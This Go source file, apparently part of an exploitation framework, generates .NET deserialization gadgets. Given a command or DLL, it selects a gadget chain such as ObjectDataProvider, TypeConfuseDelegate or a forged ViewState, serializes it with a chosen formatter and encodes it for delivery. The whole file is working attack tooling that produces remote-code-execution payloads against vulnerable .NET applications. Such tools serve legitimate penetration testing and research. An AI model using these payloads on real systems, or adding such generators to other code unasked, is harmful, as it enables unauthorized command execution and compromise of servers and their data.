package deserialization

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/hex"
	"strings"

	"github.com/vulncheck-oss/go-exploit/dotnet"
)

// GenerateDotNetGadget generates a .NET deserialization gadget with a command/URL, formatter and encoding.
//
// Gadgets (Command-based): windows-identity, claims-principal, dataset, dataset-type-spoof, object-data-provider, text-formatting-runproperties, type-confuse-delegate
// Gadgets (URL-based): object-ref, veeam-crypto-keyinfo
// Gadgets (XML-based): dataset-xmldiffgram
// Gadgets (DLL-based): axhost-state-dll, dll-reflection
// Gadgets (ViewState): viewstate - format: "base64_inner_payload:machineKey:generator"
// Gadgets (Prebuilt): Any other name loads via ReadGadget
//
// Formatters: binary/binaryformatter (default), soap/soapformatter, soapwithexceptions/soap-exceptions, los/losformatter
// Encodings: raw, hex, gzip, gzip-base64, base64-raw, default (URL-safe base64)
func GenerateDotNetGadget(gadget, cmd, formatter, encoding string) string {
	var payload string
	var ok bool

	if formatter == "" {
		formatter = dotnet.BinaryFormatter
	}

	formatterStr := mapFormatter(formatter)

	switch gadget {
	case "windows-identity":
		program, args := parseCommand(cmd)
		payload, ok = dotnet.CreateWindowsIdentity(program, args, formatterStr)
	case "claims-principal":
		program, args := parseCommand(cmd)
		payload, ok = dotnet.CreateClaimsPrincipal(program, args, formatterStr)
	case "dataset":
		program, args := parseCommand(cmd)
		payload, ok = dotnet.CreateDataSet(program, args, formatterStr)
	case "dataset-type-spoof":
		program, args := parseCommand(cmd)
		payload, ok = dotnet.CreateDataSetTypeSpoof(program, args, formatterStr)
	case "dataset-xmldiffgram":
		payload, ok = dotnet.CreateDataSetXMLDiffGram(cmd)
	case "object-data-provider":
		program, args := parseCommand(cmd)
		payload, ok = dotnet.CreateObjectDataProvider(program, args, formatterStr)
	case "text-formatting-runproperties":
		program, args := parseCommand(cmd)
		payload, ok = dotnet.CreateTextFormattingRunProperties(program, args, formatterStr)
	case "type-confuse-delegate":
		program, args := parseCommand(cmd)
		payload, ok = dotnet.CreateTypeConfuseDelegate(program, args, formatterStr)
	case "object-ref":
		payload, ok = dotnet.CreateObjectRef(cmd, formatterStr)
	case "veeam-crypto-keyinfo":
		payload, ok = dotnet.CreateVeeamCryptoKeyInfo(cmd, formatterStr)
	case "axhost-state-dll":
		dllBytes := []byte(cmd)
		if isBase64(cmd) {
			decoded, err := base64.StdEncoding.DecodeString(cmd)
			if err == nil {
				dllBytes = decoded
			}
		}
		payload, ok = dotnet.CreateAxHostStateDLL(dllBytes, formatterStr)
	case "dll-reflection":
		dllBytes := []byte(cmd)
		if isBase64(cmd) {
			decoded, err := base64.StdEncoding.DecodeString(cmd)
			if err == nil {
				dllBytes = decoded
			}
		}
		payload, ok = dotnet.CreateDLLReflection(dllBytes, formatterStr)
	case "viewstate":
		parts := strings.SplitN(cmd, ":", 3)
		if len(parts) != 3 {
			return ""
		}
		// Decode base64-encoded inner payload (first part)
		innerPayload := strings.TrimSpace(parts[0])
		if isBase64(innerPayload) {
			decoded, err := base64.StdEncoding.DecodeString(innerPayload)
			if err != nil {
				return ""
			}
			innerPayload = string(decoded)
		}

		// CreateViewstatePayload returns a base64-encoded string
		viewStateBase64, success := dotnet.CreateViewstatePayload(innerPayload, strings.TrimSpace(parts[1]), strings.TrimSpace(parts[2]))
		if !success {
			return ""
		}

		// Decode back to raw bytes because dotnetEncodingHelper will handle encoding
		decodedViewState, err := base64.StdEncoding.DecodeString(viewStateBase64)
		if err != nil {
			return ""
		}
		payload = string(decodedViewState)
		ok = true
	default:
		gadgetBytes, err := dotnet.ReadGadget(gadget, formatterStr)
		if err != nil {
			return ""
		}
		payload = string(gadgetBytes)
		ok = true
	}

	if !ok {
		return ""
	}

	return dotnetEncodingHelper([]byte(payload), encoding)
}

// parseCommand splits a command string into program and arguments.
// Wraps with "cmd /c" unless program is cmd/powershell/pwsh.
func parseCommand(cmd string) (string, string) {
	if cmd == "" {
		return "", ""
	}

	parts := strings.SplitN(cmd, " ", 2)
	if len(parts) == 1 {
		return "cmd", "/c " + cmd
	}

	program := parts[0]
	if program == "cmd" || program == "powershell" || program == "pwsh" {
		return program, parts[1]
	}

	return "cmd", "/c " + cmd
}

// mapFormatter maps user-friendly formatter names to dotnet package constants.
// Supports: binary/binaryformatter, soap/soapformatter, soapwithexceptions/soap-exceptions, los/losformatter.
func mapFormatter(formatter string) string {
	switch strings.ToLower(formatter) {
	case "binary", "binaryformatter":
		return dotnet.BinaryFormatter
	case "soap", "soapformatter":
		return dotnet.SOAPFormatter
	case "soapwithexceptions", "soap-exceptions":
		return dotnet.SOAPFormatterWithExceptions
	case "los", "losformatter":
		return dotnet.LOSFormatter
	case "":
		return ""
	default:
		return formatter
	}
}

// isBase64 checks if a string is valid base64.
// Auto-detects base64-encoded DLL payloads.
func isBase64(s string) bool {
	if len(s) < 4 {
		return false
	}
	_, err := base64.StdEncoding.DecodeString(s)
	return err == nil
}

// dotnetEncodingHelper performs encoding of the generated gadget based on provided options.
// Supports: raw, hex, gzip, gzip-base64, base64-raw, default (URL-safe base64).
func dotnetEncodingHelper(returnData []byte, encoding string) string {
	switch encoding {
	case "raw":
		return string(returnData)
	case "hex":
		return hex.EncodeToString(returnData)
	case "gzip":
		buffer := &bytes.Buffer{}
		writer := gzip.NewWriter(buffer)
		if _, err := writer.Write(returnData); err != nil {
			return ""
		}
		_ = writer.Close()
		return buffer.String()
	case "gzip-base64":
		buffer := &bytes.Buffer{}
		writer := gzip.NewWriter(buffer)
		if _, err := writer.Write(returnData); err != nil {
			return ""
		}
		_ = writer.Close()
		return urlsafeBase64Encode(buffer.Bytes())
	case "base64-raw":
		return base64.StdEncoding.EncodeToString(returnData)
	default:
		return urlsafeBase64Encode(returnData)
	}
}
